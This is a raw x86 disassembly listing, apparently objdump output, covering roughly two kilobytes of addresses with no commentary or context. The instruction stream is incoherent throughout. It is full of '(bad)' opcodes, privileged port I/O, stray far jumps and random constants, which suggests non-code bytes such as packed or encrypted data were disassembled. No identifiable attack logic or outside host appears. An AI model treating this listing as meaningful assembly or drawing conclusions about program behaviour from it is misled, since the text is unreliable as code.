  4149f8:	xchg   ebx,eax
  4149f9:	or     dl,BYTE PTR [esi+0xd]
  4149fc:	xchg   ecx,eax
  4149fd:	xor    eax,0xb159d9d4
  414a02:	ins    DWORD PTR es:[edi],dx
  414a03:	int3   
  414a04:	lock xor al,0xe5
  414a07:	dec    edx
  414a08:	jbe    0x414a36
  414a0a:	into   
  414a0b:	lock adc ch,BYTE PTR [ebp+0x454faf7b]
  414a12:	cld    
  414a13:	jl     0x414a48
  414a15:	inc    eax
  414a16:	idiv   edi
  414a18:	ja     0x41499d
  414a1a:	out    dx,eax
  414a1b:	mul    cl
  414a1d:	add    esi,edi
  414a1f:	ret    0xafdd
  414a22:	push   edx
  414a23:	and    edx,esi
  414a25:	cs fwait
  414a27:	loopne 0x4149b5
  414a29:	or     bl,BYTE PTR [ecx+0x67]
  414a2c:	iret   
  414a2d:	sbb    eax,0x7d01a06e
  414a32:	in     eax,0xf2
  414a34:	mov    edi,0xc95feb94
  414a39:	mov    al,ds:0xb89042b4
  414a3e:	sbb    edx,ebx
  414a40:	mov    eax,fs
  414a42:	sub    eax,0x6f1f0fb0
  414a47:	ss mov cl,0xcb
  414a4a:	scas   eax,DWORD PTR es:[edi]
  414a4b:	mov    ds:0x2d086550,al
  414a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a51:	int    0x73
  414a53:	shr    edx,0x75
  414a56:	imul   ebp,DWORD PTR [esi-0x7d],0x132897a7
  414a5d:	sbb    al,0xce
  414a5f:	mov    esp,0x7ebeab54
  414a64:	out    0x95,al
  414a66:	aas    
  414a67:	mov    DWORD PTR es:[ebx],0x9988aba8
  414a6e:	dec    ebp
  414a6f:	mul    DWORD PTR [eax+0x48]
  414a72:	xor    cl,ah
  414a74:	jl     0x414ab8
  414a76:	es mov dh,0x85
  414a79:	mov    dh,0xa7
  414a7b:	push   ecx
  414a7c:	and    dh,ah
  414a7e:	aaa    
  414a7f:	sub    eax,0xb97d3768
  414a84:	lock arpl bp,si
  414a87:	or     DWORD PTR [ebx+0x44a68717],edx
  414a8d:	push   edi
  414a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a8f:	cmp    eax,0x447c7014
  414a94:	dec    esi
  414a95:	lock dec ebx
  414a97:	(bad)  
  414a98:	mov    ds:0xbf0eee69,eax
  414a9d:	in     eax,0xaa
  414a9f:	sbb    edx,DWORD PTR [esp+eax*8-0x4522a13e]
  414aa6:	sti    
  414aa7:	add    DWORD PTR [eax],eax
  414aa9:	mov    esi,0x9b9e7eff
  414aae:	or     ebp,DWORD PTR ds:0x78cd3dcf
  414ab4:	retf   0x6eac
  414ab7:	fist   WORD PTR [esi+0x2424b213]
  414abd:	cmp    al,0x38
  414abf:	jae    0x414abe
  414ac1:	or     al,0x4d
  414ac3:	xchg   esi,eax
  414ac4:	test   BYTE PTR [edi],dl
  414ac6:	and    BYTE PTR [edi],0x9
  414ac9:	pop    es
  414aca:	xchg   dh,al
  414acc:	push   cs
  414acd:	add    al,0x9b
  414acf:	mov    esp,0x6388cffe
  414ad4:	mov    WORD PTR [ebp-0x55f4e44b],cs
  414ada:	adc    eax,0xc4f95efd
  414adf:	pusha  
  414ae0:	(bad)  
  414ae2:	retf   0xabf
  414ae5:	dec    edi
  414ae6:	mov    al,ds:0x97b2911f
  414aeb:	sbb    esp,0x960dfb10
  414af1:	mov    esp,0xd923529c
  414af6:	int3   
  414af7:	(bad)  
  414af8:	es ja  0x414ab1
  414afb:	push   esi
  414afc:	enter  0x2e9c,0x19
  414b00:	jmp    0x414ace
  414b02:	in     eax,dx
  414b03:	(bad)  
  414b04:	mov    dl,0x8b
  414b06:	pop    edi
  414b07:	pop    ecx
  414b08:	xchg   edi,eax
  414b09:	das    
  414b0a:	bound  ecx,QWORD PTR [ecx+0x46]
  414b0d:	or     eax,0xb0ea49a2
  414b12:	int3   
  414b13:	fbstp  TBYTE PTR [edx+0x8]
  414b16:	mov    al,BYTE PTR [esi-0x6ba3d4bc]
  414b1c:	sub    BYTE PTR [ebp+0x22],cl
  414b1f:	jle    0x414b1d
  414b21:	mov    ds:0xa8711062,al
  414b26:	mov    edx,0x6b288a75
  414b2b:	cld    
  414b2c:	mov    ecx,0xfa5e9e82
  414b31:	addr16 lahf 
  414b33:	and    al,0xda
  414b35:	mov    esp,0xe0ab8cfb
  414b3a:	dec    edx
  414b3b:	ins    DWORD PTR es:[edi],dx
  414b3c:	cs (bad) 
  414b3e:	pop    ss
  414b3f:	loop   0x414afe
  414b41:	mov    ebp,0xea1174a
  414b46:	jo     0x414b90
  414b48:	lock inc edx
  414b4a:	push   0xc063b26b
  414b4f:	xchg   BYTE PTR [ecx+0x7d],ah
  414b52:	inc    ebx
  414b53:	sbb    eax,DWORD PTR [ebp+0x7f]
  414b56:	mov    esi,0xa7c6c544
  414b5b:	xor    eax,0x509e713a
  414b60:	stos   BYTE PTR es:[edi],al
  414b61:	or     ch,BYTE PTR [ebx]
  414b63:	pop    es
  414b64:	jg     0x414b8b
  414b66:	or     BYTE PTR [ecx],0x83
  414b69:	test   eax,0xfc93b3c5
  414b6e:	cs sub eax,0x70f6b923
  414b74:	jae    0x414be6
  414b76:	rcr    DWORD PTR ds:0x14d5ff41,0x30
  414b7d:	scas   al,BYTE PTR es:[edi]
  414b7e:	jae    0x414b85
  414b80:	sbb    dh,BYTE PTR [esi]
  414b82:	mov    ds:0xcffbe0e,eax
  414b87:	call   0x24064f61
  414b8c:	call   DWORD PTR [eax+0xdf9a859]
  414b92:	mov    ds:0x1acbc930,al
  414b97:	inc    edx
  414b98:	fwait
  414b99:	popa   
  414b9a:	les    esi,FWORD PTR [ecx-0x2d9c1991]
  414ba0:	xchg   DWORD PTR [ebx+0x3e],edx
  414ba3:	fstp   st(3)
  414ba5:	gs loop 0x414b7c
  414ba8:	mov    esi,0xb5063bb9
  414bad:	data16 aaa 
  414baf:	shl    DWORD PTR [ecx],0x7c
  414bb2:	rcr    BYTE PTR [ebp+eax*2+0x2ea6ce1b],cl
  414bb9:	or     al,0x4b
  414bbb:	ds xor al,0x9b
  414bbe:	adc    eax,0x840a972b
  414bc3:	test   eax,0xc4fa696
  414bc8:	xchg   esi,eax
  414bc9:	push   esp
  414bca:	dec    esp
  414bcb:	and    eax,0x46dc52f1
  414bd0:	bound  esi,QWORD PTR [ecx-0x384645ab]
  414bd6:	int3   
  414bd7:	fsubr  st(4),st
  414bd9:	cmp    bh,cl
  414bdb:	mov    esi,0xd149a5ce
  414be0:	sub    DWORD PTR [edi],0x13
  414be3:	mov    dh,0x31
  414be5:	jnp    0x414bbd
  414be7:	stc    
  414be8:	mov    ebp,0x5a1939b3
  414bed:	jg     0x414bb9
  414bef:	bound  edx,QWORD PTR [ecx]
  414bf1:	mov    WORD PTR [ecx+0x24],ds
  414bf4:	mov    ds:0x67008cb3,eax
  414bf9:	retf   
  414bfa:	push   ebx
  414bfb:	sar    DWORD PTR [edi+esi*2-0x1d12e78a],0xad
  414c03:	xor    edi,DWORD PTR [ebx+0x6be0de15]
  414c09:	aam    0x7b
  414c0b:	inc    ebp
  414c0c:	(bad)  
  414c0e:	imul   ecx,DWORD PTR [edx+0x75],0xeccbb5cc
  414c15:	xchg   ecx,eax
  414c16:	rcr    BYTE PTR [edi-0x7887532],cl
  414c1c:	sahf   
  414c1d:	sbb    DWORD PTR [ecx-0x26907bef],ebp
  414c23:	ds addr16 ss pop ss
  414c27:	push   ss
  414c28:	sti    
  414c29:	cmp    eax,0xaec229b2
  414c2e:	ds and eax,0x3df8ad53
  414c34:	mov    edx,0xe9cdcfa6
  414c39:	bound  edx,QWORD PTR [ebx+0x71]
  414c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c3d:	ja     0x414bcf
  414c3f:	push   ds
  414c40:	cmp    al,0xd0
  414c42:	xchg   dl,dh
  414c44:	int3   
  414c45:	and    DWORD PTR [ecx],ebp
  414c47:	and    eax,0xba143d49
  414c4c:	mov    esi,fs
  414c4e:	clc    
  414c4f:	mov    esi,0xa482ae89
  414c54:	push   0xffffffec
  414c56:	jns    0x414c5c
  414c58:	adc    eax,0x422d040c
  414c5d:	rol    ebp,0xd
  414c60:	pop    ecx
  414c61:	cld    
  414c62:	xchg   esi,eax
  414c63:	push   0x3e
  414c65:	xor    DWORD PTR [edx],ebx
  414c67:	jecxz  0x414cc7
  414c69:	mov    eax,0x3b72484b
  414c6e:	fcomp  DWORD PTR [edi+0x6076eb42]
  414c74:	nop
  414c75:	mov    edi,cs
  414c77:	sahf   
  414c78:	inc    ebp
  414c79:	sub    esi,DWORD PTR [ecx+0x72fee6f4]
  414c7f:	push   es
  414c80:	fwait
  414c81:	popa   
  414c82:	enter  0x26f7,0x66
  414c86:	xor    bh,dl
  414c88:	call   0xc67ddb91
  414c8d:	push   edx
  414c8e:	mov    edi,DWORD PTR [eax-0x7de2bab3]
  414c94:	stc    
  414c95:	and    ecx,DWORD PTR [ebx-0x12247b0f]
  414c9b:	mov    ebx,0x6ec71158
  414ca0:	xchg   edx,eax
  414ca1:	and    edi,DWORD PTR [edi]
  414ca3:	jg     0x414c66
  414ca5:	jnp    0x414cf2
  414ca7:	cmp    eax,DWORD PTR [ebp-0x2e]
  414caa:	ds mov eax,0xb193831f
  414cb0:	not    DWORD PTR [edx]
  414cb2:	lods   al,BYTE PTR ds:[esi]
  414cb3:	pop    esp
  414cb4:	cmp    eax,0x5f78b584
  414cb9:	repz retf 0x6995
  414cbd:	jp     0x414cf3
  414cbf:	and    cl,BYTE PTR [ebp-0x2e167ef4]
  414cc5:	repz mov fs:0xca69ae58,eax
  414ccc:	inc    esp
  414ccd:	ret    0xa7b7
  414cd0:	mov    al,0x42
  414cd2:	inc    ebp
  414cd3:	test   DWORD PTR [eax-0x3b919d66],esp
  414cd9:	stc    
  414cda:	push   edi
  414cdb:	out    dx,eax
  414cdc:	shl    al,1
  414cde:	xor    BYTE PTR [ecx+0x70808edd],ch
  414ce4:	adc    edx,DWORD PTR [ebx+0x4e]
  414ce7:	mov    WORD PTR [ebx-0x49],es
  414cea:	pusha  
  414ceb:	push   ebx
  414cec:	push   ebx
  414ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cee:	leave  
  414cef:	jl     0x414cc5
  414cf1:	inc    esp
  414cf2:	xchg   dh,dh
  414cf4:	stos   DWORD PTR es:[edi],eax
  414cf5:	push   ds
  414cf6:	je     0x414cbd
  414cf8:	pop    edi
  414cf9:	jne    0x414cf6
  414cfb:	sub    BYTE PTR [edx-0x1d],ch
  414cfe:	dec    edx
  414cff:	and    eax,0x8601160f
  414d04:	repz rcr bh,1
  414d07:	out    0x22,eax
  414d09:	xchg   DWORD PTR [ebx+eiz*4+0x49a8525d],edx
  414d10:	loope  0x414d50
  414d12:	in     eax,dx
  414d13:	mov    dl,0x7d
  414d15:	xor    BYTE PTR [ecx+0x7d],0xba
  414d19:	fist   DWORD PTR [edx-0x2117d63f]
  414d1f:	ret    
  414d20:	aad    0xa3
  414d22:	pop    ds
  414d23:	pop    ds
  414d24:	pop    ebp
  414d25:	js     0x414cee
  414d27:	icebp  
  414d28:	js     0x414d52
  414d2a:	mov    eax,ds:0x7d5ef1ff
  414d2f:	push   0x3fa585f
  414d34:	aam    0xa2
  414d36:	ja     0x414d4d
  414d38:	push   ds
  414d39:	or     eax,0xd0b9ce44
  414d3e:	loope  0x414da4
  414d40:	or     BYTE PTR [ecx+0x702177c],bl
  414d46:	add    DWORD PTR [ecx-0x2],0xffffffe6
  414d4a:	jno    0x414d67
  414d4c:	dec    edi
  414d4d:	xor    dh,BYTE PTR [eax-0x63]
  414d50:	sub    edi,DWORD PTR [ebp+0x22]
  414d53:	dec    edx
  414d54:	xor    al,0x36
  414d56:	addr16 addr16 out 0x1c,al
  414d5a:	inc    ebx
  414d5b:	js     0x414d2a
  414d5d:	das    
  414d5e:	jb     0x414ce8
  414d60:	jne    0x414db1
  414d62:	shl    BYTE PTR [edx-0x7f],0xe6
  414d66:	push   ds
  414d67:	jae    0x414d15
  414d69:	mov    ebx,0x655cfad8
  414d6e:	out    0xdd,eax
  414d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d71:	dec    eax
  414d72:	nop
  414d73:	mov    WORD PTR [ecx+0x4dfc494c],ds
  414d79:	inc    eax
  414d7a:	mov    esp,0x2981ad63
  414d7f:	sub    eax,0xd391752a
  414d84:	or     BYTE PTR [esi+0x1a3a5cd],ah
  414d8a:	sar    BYTE PTR [esi+0x3d092867],1
  414d90:	inc    esi
  414d91:	(bad)  
  414d92:	int3   
  414d93:	cmp    eax,0xfe5edd85
  414d98:	sub    eax,0x55804f78
  414d9d:	shl    DWORD PTR [edi+0x7d],1
  414da0:	or     al,0x50
  414da2:	mov    bh,0x7
  414da4:	pop    esp
  414da5:	ret    0xf1e9
  414da8:	mov    dl,0xa2
  414daa:	ret    
  414dab:	loopne 0x414d2f
  414dad:	mov    eax,0x267ddbcf
  414db2:	(bad)  
  414db3:	rol    DWORD PTR [eax],1
  414db5:	cs (bad) 
  414db7:	ret    
  414db8:	popf   
  414db9:	adc    edi,edi
  414dbb:	cld    
  414dbc:	push   ss
  414dbd:	xchg   edi,eax
  414dbe:	cmp    DWORD PTR [ebx-0x15],esi
  414dc1:	sub    edi,DWORD PTR ds:0x6449ebbd
  414dc7:	or     BYTE PTR [eax],cl
  414dc9:	popa   
  414dca:	pusha  
  414dcb:	xchg   edx,eax
  414dcc:	xchg   esp,eax
  414dcd:	push   edx
  414dce:	push   edi
  414dcf:	sub    DWORD PTR [edx],edx
  414dd1:	pop    eax
  414dd2:	dec    edx
  414dd3:	setno  al
  414dd6:	in     al,0x74
  414dd8:	out    dx,al
  414dd9:	int3   
  414dda:	mov    edx,0x5344c28a
  414ddf:	dec    edx
  414de0:	push   edi
  414de1:	jnp    0x414d9e
  414de3:	nop
  414de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414de5:	sub    eax,0x62fc11d4
  414dea:	mov    edi,0xe4b8a4ae
  414def:	mov    dh,dl
  414df1:	(bad)  
  414df2:	xchg   esi,eax
  414df3:	call   0xbeaa:0x47964626
  414dfa:	inc    edx
  414dfb:	dec    ecx
  414dfc:	stos   DWORD PTR es:[edi],eax
  414dfd:	mov    eax,ds:0x4cc55132
  414e02:	and    BYTE PTR [edi-0x43632e1c],al
  414e08:	in     al,dx
  414e09:	jge    0x414d8e
  414e0b:	mov    bl,bl
  414e0d:	dec    edx
  414e0e:	adc    eax,0x59fd3bdf
  414e13:	aam    0x67
  414e15:	push   0x1a0c6ea0
  414e1a:	mov    ebx,edx
  414e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e1d:	enter  0x9f61,0xf3
  414e21:	or     bh,BYTE PTR ds:0x2bbb1d94
  414e27:	in     eax,0x69
  414e29:	dec    BYTE PTR [ecx-0x33d96328]
  414e2f:	pop    eax
  414e30:	into   
  414e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e32:	js     0x414e40
  414e34:	cs not bh
  414e37:	cmp    al,0x3b
  414e39:	push   es
  414e3a:	ins    BYTE PTR es:[edi],dx
  414e3b:	daa    
  414e3c:	stos   BYTE PTR es:[edi],al
  414e3d:	and    DWORD PTR [edx-0x1e],eax
  414e40:	fimul  DWORD PTR [ecx-0x321aaa56]
  414e46:	ror    DWORD PTR [ebx],1
  414e48:	adc    al,0x7
  414e4a:	and    DWORD PTR [ebx-0x580dfce9],0x6b
  414e51:	test   al,0xf9
  414e53:	adc    bh,dl
  414e55:	or     dl,dh
  414e57:	jmp    0xb276:0xb99ccbbe
  414e5e:	pushf  
  414e5f:	into   
  414e60:	leave  
  414e61:	push   0x2f58ae50
  414e66:	pop    eax
  414e67:	pop    ecx
  414e68:	clc    
  414e69:	lock aad 0x3c
  414e6c:	mov    edx,0xd49cf1f
  414e71:	push   0x52
  414e73:	dec    ecx
  414e74:	sub    al,0x51
  414e76:	sahf   
  414e77:	sub    DWORD PTR [edx+0x316e9fd1],edi
  414e7d:	and    BYTE PTR [eax+0x44dfc0f4],al
  414e83:	aaa    
  414e84:	xor    esp,DWORD PTR [ecx+0x5836fbf2]
  414e8a:	dec    ecx
  414e8b:	sbb    eax,0x740feeba
  414e90:	sahf   
  414e91:	mov    WORD PTR ds:0xda5418a5,?
  414e97:	jb     0x414e76
  414e99:	aam    0x8f
  414e9b:	mov    ebp,0x111a3b5d
  414ea0:	xchg   esp,eax
  414ea1:	or     DWORD PTR [edx],ecx
  414ea3:	dec    edx
  414ea4:	dec    ebp
  414ea5:	jp     0x414e4b
  414ea7:	rcl    cl,cl
  414ea9:	sub    DWORD PTR [ebp+0x30],esi
  414eac:	xor    BYTE PTR [esi-0x623b5285],dh
  414eb2:	mov    BYTE PTR [edx-0xe],ch
  414eb5:	mov    cl,0x8c
  414eb7:	and    ebx,DWORD PTR [eax+0x1642cf32]
  414ebd:	pop    es
  414ebe:	xchg   esp,eax
  414ebf:	adc    esi,ebp
  414ec1:	adc    DWORD PTR [esp+ebx*2-0x1afcc32f],edx
  414ec8:	int    0xf2
  414eca:	icebp  
  414ecb:	jo     0x414f0b
  414ecd:	mov    ah,0x5
  414ecf:	inc    ebx
  414ed0:	retf   0x28ba
  414ed3:	jmp    0x93184b1a
  414ed8:	aam    0x99
  414eda:	or     dh,BYTE PTR [esi-0x36]
  414edd:	ret    0xa0d7
  414ee0:	xor    bh,cl
  414ee2:	mov    al,ds:0x1726ca99
  414ee7:	sub    BYTE PTR [esi-0x33d1249e],dh
  414eed:	xchg   edx,eax
  414eee:	cmp    dl,BYTE PTR [ecx-0x7a]
  414ef1:	(bad)  
  414ef2:	push   ecx
  414ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ef4:	mov    eax,0x2cfbe6c7
  414ef9:	xchg   ebx,eax
  414efa:	or     al,0x11
  414efc:	mov    al,ds:0x7e53da92
  414f01:	mov    ?,WORD PTR [edi+esi*1]
  414f04:	add    al,0xae
  414f06:	or     DWORD PTR [ebx],0xcc001626
  414f0c:	sar    BYTE PTR [edi-0x2b],1
  414f0f:	push   ds
  414f10:	mov    WORD PTR [eax],fs
  414f12:	out    0xf0,al
  414f14:	xchg   ecx,eax
  414f15:	xchg   ebx,eax
  414f16:	jne    0x414f14
  414f18:	lods   al,BYTE PTR ds:[esi]
  414f19:	loope  0x414ea3
  414f1b:	cmc    
  414f1c:	jle    0x414f83
  414f1e:	add    DWORD PTR [esi+ebp*8+0x44],esi
  414f22:	dec    eax
  414f23:	ret    0x3e7f
  414f26:	dec    edi
  414f27:	and    eax,0xa159573b
  414f2c:	fs ds daa 
  414f2f:	fnsave [ebp+0x71]
  414f32:	sar    BYTE PTR [edi-0x2a],cl
  414f35:	sbb    BYTE PTR [eax-0x31ca23ce],ah
  414f3b:	leave  
  414f3c:	and    al,0x12
  414f3e:	pusha  
  414f3f:	ret    0x2bfc
  414f42:	jmp    0x414f46
  414f44:	cmp    ch,BYTE PTR [ebp-0x5d29fbbd]
  414f4a:	lods   al,BYTE PTR ds:[esi]
  414f4b:	push   0xffffff82
  414f4d:	mov    al,0xa7
  414f4f:	loope  0x414f1a
  414f51:	inc    edx
  414f52:	in     eax,0x2a
  414f54:	addr16 jle 0x414fa1
  414f57:	mov    ds:0x11814ce6,al
  414f5c:	push   esi
  414f5d:	adc    ah,BYTE PTR [edx+0xe6baf44]
  414f63:	sub    BYTE PTR [eax],ch
  414f65:	aad    0x96
  414f67:	pushf  
  414f68:	stc    
  414f69:	xchg   ebx,eax
  414f6a:	popf   
  414f6b:	and    BYTE PTR [esi+ebx*4],cl
  414f6e:	iret   
  414f6f:	cmp    eax,eax
  414f71:	(bad)  
  414f72:	stc    
  414f73:	les    edi,FWORD PTR [ebx+eax*1+0x57]
  414f77:	adc    ecx,DWORD PTR [edx+0x620484d9]
  414f7d:	mov    al,BYTE PTR gs:[ecx]
  414f80:	das    
  414f81:	inc    dx
  414f83:	inc    esp
  414f84:	repnz arpl WORD PTR [ecx+0x755ac9f5],sp
  414f8b:	test   eax,0x21bdec16
  414f90:	push   ds
  414f91:	pusha  
  414f92:	sub    DWORD PTR [ecx+0x7a],0x8fc08e0
  414f99:	sbb    eax,esp
  414f9b:	add    al,0x94
  414f9d:	inc    ebx
  414f9e:	int    0xf4
  414fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa1:	jl     0x414fc4
  414fa3:	repnz pusha 
  414fa5:	pextrw ebp,mm1,0xf1
  414fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414faa:	mov    ah,0x74
  414fac:	fsubr  DWORD PTR [edi-0xdc1a9b]
  414fb2:	dec    ebx
  414fb3:	dec    DWORD PTR [ebx+0x2576a1f]
  414fb9:	fadd   DWORD PTR [ebp+0x5cc10726]
  414fbf:	cwde   
  414fc0:	mul    DWORD PTR [edi+0x73]
  414fc3:	mov    ebp,0xdff9b18d
  414fc8:	loope  0x414f79
  414fca:	adc    BYTE PTR [eax],dl
  414fcc:	fdivr  st(1),st
  414fce:	cdq    
  414fcf:	lods   al,BYTE PTR ds:[esi]
  414fd0:	in     al,dx
  414fd1:	dec    eax
  414fd2:	loopne 0x414f79
  414fd4:	mov    esi,0xafda8ec9
  414fd9:	shr    BYTE PTR [eax+0xb],1
  414fdc:	out    0x1f,eax
  414fde:	aas    
  414fdf:	dec    ecx
  414fe0:	and    bl,BYTE PTR ds:0xb4257111
  414fe6:	sbb    eax,0x9fd36e26
  414feb:	jbe    0x41501c
  414fed:	pop    edx
  414fee:	lahf   
  414fef:	clc    
  414ff0:	mov    ebx,0xd54b24c3
  414ff5:	cmp    al,BYTE PTR [ecx-0x33e419fa]
  414ffb:	and    al,ch
  414ffd:	dec    ebp
  414ffe:	cs cld 
  415000:	dec    edi
  415001:	call   0x72f0d731
  415006:	icebp  
  415007:	test   edi,esi
  415009:	jbe    0x415072
  41500b:	jmp    0x5ed5:0x8dd6ccdb
  415012:	or     ah,BYTE PTR [edx-0x1af7dade]
  415018:	add    DWORD PTR [esi-0x56],edi
  41501b:	je     0x415021
  41501d:	xchg   ecx,eax
  41501e:	frstor [edx]
  415020:	test   BYTE PTR [edx+0x5d],al
  415023:	pop    ebx
  415024:	cli    
  415025:	add    eax,0x3bcf2c04
  41502a:	(bad)  
  41502b:	je     0x41502a
  41502d:	jns    0x41505f
  41502f:	add    al,BYTE PTR [eax-0x429f3ec9]
  415035:	jmp    0x3e96:0x85ac8476
  41503c:	idiv   DWORD PTR [esi+0x880858a]
  415042:	aam    0xfb
  415044:	adc    ecx,DWORD PTR [eax]
  415046:	clc    
  415047:	je     0x41502f
  415049:	mov    BYTE PTR [eax+esi*8],bl
  41504c:	ds cld 
  41504e:	imul   ebp,DWORD PTR [ebx-0x32],0x3db93085
  415055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415056:	adc    al,0xe2
  415058:	jmp    0x5bf6:0x4f01ecff
  41505f:	rcl    DWORD PTR [ecx-0x446141bc],1
  415065:	push   esp
  415066:	mov    al,ds:0x570dd526
  41506b:	dec    ebx
  41506c:	inc    eax
  41506d:	jno    0x41501c
  41506f:	jnp    0x41508a
  415071:	pop    ebp
  415072:	inc    ebx
  415073:	mov    esi,0x89eb4781
  415078:	mov    edx,0x52e4b843
  41507d:	cmp    DWORD PTR [ebp-0x3],0x53
  415081:	push   ecx
  415082:	scas   eax,DWORD PTR es:[edi]
  415083:	xchg   edx,eax
  415084:	sub    ecx,DWORD PTR [edi-0x38]
  415087:	dec    edi
  415088:	clc    
  415089:	inc    ebx
  41508a:	dec    esp
  41508b:	or     al,0x58
  41508d:	dec    edi
  41508e:	push   ebx
  41508f:	jns    0x4150f6
  415091:	gs dec eax
  415093:	add    DWORD PTR [esi-0xc655b04],0x75
  41509a:	and    dh,BYTE PTR [edi-0x235f13d2]
  4150a0:	xchg   edi,eax
  4150a1:	lea    edx,[ecx+0x22]
  4150a4:	mov    cl,0xb9
  4150a6:	mov    eax,ds:0x2ca62d92
  4150ab:	fs or  dl,ah
  4150ae:	push   esi
  4150af:	push   ecx
  4150b0:	jg     0x41505e
  4150b2:	jno    0x415055
  4150b4:	jge    0x41508b
  4150b6:	sub    ebp,DWORD PTR [eax+0x17]
  4150b9:	mov    cl,0xa9
  4150bb:	aam    0xad
  4150bd:	repz jno 0x415116
  4150c0:	pop    ds
  4150c1:	cld    
  4150c2:	out    0x3a,al
  4150c4:	popf   
  4150c5:	and    eax,0xafb8a086
  4150ca:	(bad)  
  4150cb:	and    ebx,ebx
  4150cd:	mov    edx,0x595962b7
  4150d2:	mov    ds,WORD PTR [ebx+0x10163905]
  4150d8:	rol    BYTE PTR [eax],cl
  4150da:	loope  0x41506e
  4150dc:	sub    cl,al
  4150de:	into   
  4150df:	(bad)  [esi-0x4]
  4150e2:	inc    edx
  4150e3:	mov    ds:0xc2f06557,al
  4150e8:	retf   
  4150e9:	cwde   
  4150ea:	and    DWORD PTR [edx-0x3],ebx
  4150ed:	and    BYTE PTR ds:0xf82d22db,0x7a
  4150f4:	std    
  4150f5:	cmp    DWORD PTR [ecx+0x2e],ecx
  4150f8:	and    DWORD PTR gs:[ebx-0x5f],esp
  4150fc:	out    dx,eax
  4150fd:	xchg   cl,bh
  4150ff:	xchg   ecx,eax
  415100:	push   ds
  415101:	or     dl,BYTE PTR [edx+0x28]
  415104:	mov    DWORD PTR [ebp+0x2e],ebx
  415107:	mov    ecx,0x9e8cc934
  41510c:	sub    eax,0x62d2ec9d
  415111:	sti    
  415112:	sub    dl,BYTE PTR [edx]
  415114:	jae    0x4150f3
  415116:	dec    ecx
  415117:	test   BYTE PTR [edi+0x6da03c46],0xd1
  41511e:	jae    0x4150f9
  415120:	and    eax,0x8a3eb859
  415125:	pop    esp
  415126:	fsub   DWORD PTR ds:0x8e88cd31
  41512c:	mov    ecx,0x63c02642
  415131:	add    DWORD PTR [edx-0x3f],ecx
  415134:	push   ebp
  415135:	sub    al,0xa3
  415137:	xor    eax,0x46bc3660
  41513c:	pusha  
  41513d:	cmc    
  41513e:	and    bl,ch
  415140:	and    al,0x98
  415142:	jo     0x415169
  415144:	std    
  415145:	call   0x8855:0x351e8b47
  41514c:	sub    BYTE PTR [edi],bl
  41514e:	pop    edi
  41514f:	out    0x0,eax
  415151:	in     al,0xa6
  415153:	das    
  415154:	jmp    0x54ae:0x5b107c86
  41515b:	pop    ebp
  41515c:	jmp    0x4151b1
  41515e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41515f:	and    edi,ecx
  415161:	mov    dl,0x6d
  415163:	jno    0x415139
  415165:	retf   0x4716
  415168:	jb     0x41519f
  41516a:	push   edi
  41516b:	sub    ebx,DWORD PTR [edx]
  41516d:	leave  
  41516e:	sti    
  41516f:	or     BYTE PTR [esp+ebp*2],ah
  415172:	loopne 0x41512b
  415174:	fstp   TBYTE PTR [eax-0x6e]
  415177:	rcr    dh,1
  415179:	sub    DWORD PTR [ecx+edi*2],edx
  41517c:	xor    DWORD PTR gs:[eax+0x2d],edx
  415180:	cmp    ch,BYTE PTR [ebp+0xfa63f1f]
  415186:	or     eax,0x1237dc2f
  41518b:	(bad)  ds:0x9e107e11
  415191:	jns    0x41519a
  415193:	adc    al,BYTE PTR [edx]
  415195:	push   0x36b1cbb3
  41519a:	mov    ch,0xc6
  41519c:	add    edi,DWORD PTR [eax-0x10ed4f33]
  4151a2:	mov    dh,0xf2
  4151a4:	sbb    DWORD PTR [ebx+eiz*4-0x663c53e1],ebx
  4151ab:	xchg   ecx,eax
  4151ac:	sub    BYTE PTR [edi+0x52],0xe5
  4151b0:	push   cs
  4151b1:	iret   
  4151b2:	mov    ch,0x5c
  4151b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151b5:	ds loope 0x415152
  4151b8:	xchg   esp,eax
  4151b9:	fcomp  DWORD PTR [esi-0x3]
  4151bc:	push   0xffffffb4
  4151be:	push   0xffffffd7
  4151c0:	shr    BYTE PTR [ecx+edx*4],1
  4151c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151c4:	lds    edx,FWORD PTR [edx+0x29]
  4151c7:	nop    esi
  4151ca:	mov    ds:0x6cc77a34,al
  4151cf:	jge    0x4151fa
  4151d1:	mov    edi,0x91d4ab2c
  4151d6:	xor    BYTE PTR [edi+ebp*8-0x79a9a500],bh
  4151dd:	mov    cs,ecx
  4151df:	adc    bl,BYTE PTR [esi+eiz*8]
  4151e2:	pushf  
  4151e3:	repnz das 
  4151e5:	mov    ebx,0xc065ff09
  4151ea:	push   es
  4151eb:	addr16 xchg ebp,eax
  4151ed:	in     eax,0xb8
  4151ef:	add    cl,BYTE PTR [edi-0xcae03e3]
  4151f5:	xor    eax,0xdcf83778
  4151fa:	push   ebx
  4151fb:	fs sub eax,0xc6d2258
  415201:	jecxz  0x41518f
  415203:	adc    eax,0x52b509e8
  415208:	sub    ecx,edx
  41520a:	jmp    0xadae520
  41520f:	push   esi
  415210:	popa   
  415211:	loopne 0x4151e9
  415213:	add    edi,DWORD PTR [ebp-0x1e]
  415216:	and    BYTE PTR [eax-0x3ee97b7f],dh
  41521c:	xchg   esi,eax
  41521e:	mov    esp,0x7dcca73c
  415223:	xchg   ch,ah
  415225:	ret    0xf272
  415228:	adc    DWORD PTR [ecx+0x66],esi
  41522b:	shl    bl,0x88
  41522e:	adc    BYTE PTR [ebx],ah
  415230:	adc    esi,DWORD PTR [eax+0x2a]
  415233:	cmp    bh,bh
  415235:	into   
  415236:	mov    al,0x11
  415238:	mov    al,0xab
  41523a:	mov    ds:0x8e85e44,eax
  41523f:	mov    edi,0x4ae804b5
